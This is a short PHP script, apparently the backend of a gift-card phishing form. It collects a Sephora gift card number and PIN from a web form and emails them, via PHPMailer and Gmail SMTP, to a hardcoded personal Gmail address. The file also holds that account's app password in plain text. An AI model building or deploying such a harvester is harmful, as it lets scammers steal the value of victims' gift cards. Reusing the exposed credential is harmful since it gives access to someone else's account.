<?php

require 'smtp/PHPMailerAutoload.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    exit("Invalid request");
}

// ✅ form data
$card_number = $_POST['card_number'] ?? '';
$pin = $_POST['pin'] ?? '';

if (empty($card_number) || empty($pin)) {
    exit("All fields required");
}

// ✅ email body
$body = "
<h2>Sephora Gift Card Submission</h2>
<p><b>Card Number:</b> $card_number</p>
<p><b>Pin:</b> $pin</p>
";

$mail = new PHPMailer(true);

try {
    // ✅ SMTP config
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'jhnkenrick@gmail.com';
    $mail->Password = 'iclvtpqxcjdprtfh'; // app password
    $mail->SMTPSecure = 'tls';
    $mail->Port = 587;

    // ✅ sender & receiver
    $mail->setFrom('jhnkenrick@gmail.com', 'Gift Form');
    $mail->addAddress('jhnkenrick@gmail.com');

    // ✅ email content
    $mail->isHTML(true);
    $mail->Subject = 'New Gift Card Data';
    $mail->Body = $body;

    $mail->send();
    echo "success";

} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}
